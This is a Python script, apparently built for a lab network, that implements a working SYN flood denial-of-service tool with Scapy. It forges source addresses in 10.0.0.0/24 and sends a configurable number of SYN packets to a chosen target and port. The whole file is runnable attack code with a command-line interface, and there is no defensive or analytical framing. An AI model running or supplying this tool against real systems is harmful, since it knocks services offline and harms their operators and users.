import argparse
import random
import sys
import time
from scapy.all import *


def generate_spoofed_lan_ip():
    # Generates IPs within 10.0.0.0/24 but not attacker/victim/client
    return f"10.0.0.{random.randint(50, 250)}"


def syn_flood(target_ip, target_port, packet_count, delay=0, verbose=True):
    if verbose:
        print(f"[*] Starting SYN flood attack on {target_ip}:{target_port}")
        print(f"[*] Sending {packet_count} SYN packets...")

    sent_count = 0
    start_time = time.time()

    for i in range(packet_count):
        src_ip = generate_spoofed_lan_ip()

        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(
            sport=random.randint(1024, 65535),
            dport=target_port,
            flags="S",
            seq=random.randint(0, 2**32 - 1),
            window=64240,
            options=[("MSS", 1460)]
        )

        packet = ip_layer / tcp_layer

        send(packet, iface="attacker-eth0", verbose=0)
        sent_count += 1

        if delay > 0:
            time.sleep(delay)

    elapsed = time.time() - start_time
    if verbose:
        print(f"[+] Attack completed: {sent_count} packets sent in {elapsed:.2f} seconds")
        print(f"[+] Average rate: {sent_count / elapsed:.2f} packets/sec")

    return sent_count


def main():
    parser = argparse.ArgumentParser(description="SYN Flood Attack Tool")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-p", "--port", type=int, default=80)
    parser.add_argument("-c", "--count", type=int, default=1000)
    parser.add_argument("-d", "--delay", type=float, default=0)
    parser.add_argument("-q", "--quiet", action="store_true")
    args = parser.parse_args()

    try:
        syn_flood(
            target_ip=args.target,
            target_port=args.port,
            packet_count=args.count,
            delay=args.delay,
            verbose=not args.quiet
        )
    except PermissionError:
        print("Error: Root privileges required.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted.")
        sys.exit(0)


if __name__ == "__main__":
    main()
